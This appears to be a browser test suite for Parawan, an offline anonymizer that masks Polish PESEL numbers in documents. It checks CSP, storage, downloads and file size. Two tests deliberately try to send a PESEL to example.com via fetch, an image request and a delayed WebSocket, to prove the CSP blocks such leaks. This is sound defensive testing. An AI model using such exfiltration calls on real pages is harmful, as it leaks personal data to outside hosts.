// Test dymny gotowego pliku: start z przykładu, PDF, wczytanie DOCX i PDF, pobranie .txt,
// pamięć ustawień, rozmiar, landing i działająca CSP. Każdy test przez withApp(), więc po nim
// sprawdzamy zero żądań poza plikiem, zero naruszeń CSP, zero wyjątków i błędów konsoli, także
// w dobie po scenariuszu (przewinięty zegar strony).
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import path from 'node:path';
import { after, before, test } from 'node:test';
import { strToU8, zipSync } from 'fflate';
import { CSP_TARGETS, cspProblems, htmlCspProblems } from './csp.mjs';
import {
  ALLOWED_STORAGE_KEYS,
  EXAMPLE_PESEL,
  FIXTURES,
  LANDING_HTML,
  LEGACY_SKIP,
  MAX_WEB_BYTES,
  PISMO_PESEL,
  WEB_HTML,
  fileSize,
  launch,
  openApp,
  withApp,
} from './helpers.mjs';

/** @type {import('playwright').Browser} */
let browser;
before(async () => {
  browser = await launch();
});
after(async () => {
  await browser?.close();
});

const DOCX_MIME = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document';

/** Minimalny DOCX jak z edytora: same akapity w word/document.xml (fflate, jak w docx.test.ts). */
function makeDocx(paragraphs) {
  const body = paragraphs
    .map((p) => `<w:p><w:r><w:t xml:space="preserve">${p}</w:t></w:r></w:p>`)
    .join('');
  const xml =
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
    `<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>${body}</w:body></w:document>`;
  return zipSync({
    '[Content_Types].xml': strToU8(
      '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
    ),
    'word/document.xml': strToU8(xml),
  });
}

/**
 * Po wczytaniu DOCX albo PDF aplikacja sama przechodzi do „Porównania” (oryginał przekreślony
 * obok znacznika). Tekst do skopiowania i pobrania to widok „Wynik”, więc sprawdzamy go tam.
 */
async function resultText(app) {
  await app.page.getByRole('button', { name: 'Wynik', exact: true }).click();
  await app.page.waitForFunction(
    () => document.getElementById('view-result')?.getAttribute('aria-pressed') === 'true',
  );
  return app.output();
}

const bytes = (n) => n.toLocaleString('pl-PL');

test(`plik aplikacji nie przekracza ${bytes(MAX_WEB_BYTES)} B`, () => {
  const size = fileSize(WEB_HTML);
  assert.ok(size <= MAX_WEB_BYTES, `apps/web/dist/index.html ma ${bytes(size)} B, limit ${bytes(MAX_WEB_BYTES)} B`);
});

// Każda dyrektywa osobno: dopisany host w img-src albo font-src przeszedłby test samych napisów
// default-src i connect-src 'none', a obrazek z treścią pisma w adresie to też wysyłka.
for (const [name, target] of Object.entries(CSP_TARGETS)) {
  test(`${name}: CSP bez żadnego źródła spoza pliku`, async (t) => {
    const fromFile = htmlCspProblems(readFileSync(target.file, 'utf8'), target.extra);
    assert.deepEqual(fromFile, [], `CSP w pliku ${target.file}:\n${fromFile.join('\n')}`);
    await withApp(
      browser,
      t,
      '',
      async ({ page }) => {
        // To, co przeczytała przeglądarka, a nie tylko tekst pliku.
        const metas = await page.evaluate(() =>
          [...document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]')].map((m) => m.content),
        );
        assert.equal(metas.length, 1, `tagów meta CSP: ${metas.length}`);
        const problems = cspProblems(metas[0], target.extra);
        assert.deepEqual(problems, [], `CSP „${metas[0]}”:\n${problems.join('\n')}`);
      },
      { file: target.file },
    );
  });
}

test('CSP zatrzymuje próbę wysłania danych (fetch, obrazek)', async (t) => {
  await withApp(browser, t, '', async (app) => {
    const result = await app.page.evaluate(async () => {
      const img = new Image();
      const imgDone = new Promise((resolve) => {
        img.onerror = () => resolve('zablokowany');
        img.onload = () => resolve('wczytany');
      });
      img.src = 'https://example.com/piksel.png?pesel=44051401359';
      let fetched;
      try {
        await fetch('https://example.com/?pesel=44051401359', { method: 'POST', body: 'tekst' });
        fetched = 'wysłany';
      } catch {
        fetched = 'zablokowany';
      }
      return { fetched, img: await imgDone };
    });
    assert.deepEqual(result, { fetched: 'zablokowany', img: 'zablokowany' });
    // Blokada ma pochodzić z CSP pliku, a nie z przerwania w teście (route w helpers.mjs): bez
    // meta CSP oba żądania wyszłyby z przeglądarki i trafiły na tę listę.
    const leaked = await app.leakedRequests();
    assert.deepEqual(leaked, [], `żądania spoza pliku:\n${leaked.join('\n')}`);
    // Przeglądarka zgłasza naruszenie obu dyrektyw, więc wiadomo, że to CSP je zatrzymała.
    const directives = app.takeViolations((v) => v.blocked.includes('example.com')).map((v) => v.directive);
    assert.ok(directives.includes('connect-src'), `brak naruszenia connect-src: ${directives}`);
    assert.ok(directives.includes('img-src'), `brak naruszenia img-src: ${directives}`);
    // Komunikaty Chromium o zablokowaniu obu żądań przez CSP są w tym teście oczekiwane (brzmienie
    // zmienia się między wersjami, stały jest adres i wzmianka o CSP). Inne błędy, np. wyjątek
    // z timera aplikacji, zostają dla assertClean().
    app.takeConsoleErrors(/example\.com.*Content Security Policy/);
  });
});

test('bramka widzi próbę wysyłki i wyjątek odłożone na później (timer, WebSocket)', async () => {
  // Test samej bramki: scenariusz kończy się w niecałą sekundę, a zdarzenia przychodzą po 5 i 20 s
  // (minuta przewijana krok po kroku) i po 3 godzinach (skok o dobę). Bez przewinięcia zegara
  // w assertClean() wszystkie wypadłyby po zamknięciu strony.
  const app = await openApp(browser, '?demo');
  try {
    await app.demoReady();
    await app.page.evaluate(() => {
      setTimeout(() => {
        new Image().src = 'https://example.com/pozniej.png';
      }, 5_000);
      setTimeout(() => {
        throw new Error('wyjątek z timera');
      }, 20_000);
      setTimeout(
        () => {
          new WebSocket('wss://example.com/pozniej');
        },
        3 * 60 * 60_000,
      );
    });
    await assert.rejects(() => app.assertClean());
    // Obrazek zatrzymuje CSP (naruszenie img-src); bez CSP byłby żądaniem na liście wycieków.
    // Bramka ma go zobaczyć w jednej z tych postaci.
    const leaked = await app.leakedRequests();
    const imgSeen =
      app.violations.some((v) => v.directive === 'img-src' && v.blocked.includes('pozniej.png')) ||
      leaked.some((l) => l.includes('example.com/pozniej.png'));
    assert.ok(imgSeen, `bramka nie widzi odroczonego obrazka:\n${JSON.stringify(app.violations)}\n${leaked.join('\n')}`);
    assert.ok(
      leaked.some((l) => l.startsWith('WebSocket wss://example.com/pozniej')),
      `bramka nie widzi WebSocketu:\n${leaked.join('\n')}`,
    );
    assert.ok(
      app.pageErrors.some((m) => m.includes('wyjątek z timera')),
      `bramka nie widzi wyjątku z timera:\n${app.pageErrors.join('\n')}`,
    );
  } finally {
    await app.close();
  }
});

test('?demo: przykład zamaskowany, numer PESEL nie przechodzi do wyniku', async (t) => {
  await withApp(browser, t, '?demo', async (app) => {
    await app.demoReady();
    const out = await app.output();
    assert.ok(!out.includes(EXAMPLE_PESEL), `w wyniku jest numer ${EXAMPLE_PESEL}:\n${out}`);
  });
});

test('?pdftest: pdf.js działa w pliku z dysku', async (t) => {
  await withApp(browser, t, '?pdftest', async ({ page }) => {
    await page.waitForFunction(
      () => /^\[PDF (OK|FAIL)\]/.test(document.getElementById('input')?.value ?? ''),
      null,
      { timeout: 10_000 },
    );
    const value = await page.locator('#input').inputValue();
    assert.ok(value.startsWith('[PDF OK]'), `samodiagnostyka PDF: „${value.slice(0, 200)}”`);
  });
});

test('wczytany DOCX: PESEL zasłonięty w wyniku', async (t) => {
  await withApp(browser, t, '', async (app) => {
    const docx = makeDocx([
      'Wójt Gminy Brzozowa Wola',
      'Na wniosek Pana Tomasza Wierzbickiego, PESEL 85071412358, orzekam jak w sentencji.',
    ]);
    await app.page
      .locator('#file-input')
      .setInputFiles({ name: 'decyzja-test.docx', mimeType: DOCX_MIME, buffer: Buffer.from(docx) });
    await app.waitForOutput('[PESEL]');
    assert.match(await app.page.locator('#input').inputValue(), /Wierzbickiego/);
    const out = await resultText(app);
    assert.ok(!out.includes('85071412358'), `numer PESEL z DOCX przeszedł do wyniku:\n${out}`);
  });
});

test('wczytany PDF (fixtures/urzad/pismo.pdf): PESEL zasłonięty w wyniku', async (t) => {
  await withApp(browser, t, '', async (app) => {
    await app.page.locator('#file-input').setInputFiles(path.join(FIXTURES, 'pismo.pdf'));
    await app.waitForOutput('[PESEL]');
    const input = await app.page.locator('#input').inputValue();
    assert.match(input, /Kowalskiej/);
    assert.ok(input.includes(PISMO_PESEL), `w tekście z pismo.pdf nie ma numeru PISMO_PESEL ${PISMO_PESEL}`);
    const out = await resultText(app);
    assert.ok(!out.includes(PISMO_PESEL), `numer PESEL z PDF przeszedł do wyniku:\n${out}`);
  });
});

test('„Pobierz .txt” zapisuje wynik z zasłoniętym numerem PESEL', async (t) => {
  await withApp(browser, t, '?demo', async (app) => {
    await app.demoReady();
    const [download] = await Promise.all([
      app.page.waitForEvent('download'),
      app.page.getByRole('button', { name: 'Pobierz .txt' }).click(),
    ]);
    assert.match(download.suggestedFilename(), /^zanonimizowany-[\d_-]+\.txt$/);
    const text = readFileSync(await download.path(), 'utf8');
    assert.ok(text.includes('[PESEL]'), `w pobranym pliku brak [PESEL]:\n${text}`);
    assert.ok(!text.includes(EXAMPLE_PESEL), `w pobranym pliku jest numer ${EXAMPLE_PESEL}`);
  });
});

test('localStorage: tylko znane klucze ustawień, bez treści pisma', async (t) => {
  // Bez reducedMotion: przy ograniczonym ruchu przycisk pauzy animacji jest ukryty.
  const opts = { reducedMotion: 'no-preference' };
  await withApp(browser, t, '?demo', async (app) => {
    const { page } = app;
    await app.demoReady();
    // Zmiana każdego zapamiętywanego ustawienia: typ danych, tryb osób, animacja.
    await page.locator('#mask-toggles input[data-key]').first().uncheck();
    await page.locator('#pseudonyms').check();
    await page.locator('#demo-motion').click();
    const store = await page.evaluate(() => ({ ...localStorage }));
    const keys = Object.keys(store);
    const unknown = keys.filter((k) => !ALLOWED_STORAGE_KEYS.includes(k));
    assert.deepEqual(unknown, [], `nieznane klucze w localStorage: ${unknown}`);
    assert.deepEqual(keys.sort(), [...ALLOWED_STORAGE_KEYS].sort(), 'ustawienia nie zostały zapisane');
    const values = Object.values(store).join(' ');
    assert.ok(!values.includes(EXAMPLE_PESEL) && !values.includes('Kowalska'), 'treść pisma w localStorage');
  }, opts);
});

test('landing z dysku ładuje się bez żądań i błędów', async (t) => {
  await withApp(
    browser,
    t,
    '',
    async ({ page }) => {
      await page.waitForLoadState('load');
      // Przewinięcie do końca uruchamia sekcje włączane przy wejściu w kadr.
      await page.evaluate(() => window.scrollTo(0, document.documentElement.scrollHeight));
      await page.waitForTimeout(500);
      assert.match(await page.title(), /Parawan/);
    },
    { file: LANDING_HTML },
  );
});

test('stary silnik (PARAWAN_CHROMIUM): ?demo maskuje PESEL', { skip: LEGACY_SKIP }, async (t) => {
  const legacy = await launch({ legacy: true });
  try {
    await withApp(legacy, t, '?demo', async (app) => {
      await app.demoReady();
      assert.ok(!(await app.output()).includes(EXAMPLE_PESEL));
    });
  } finally {
    await legacy.close();
  }
});
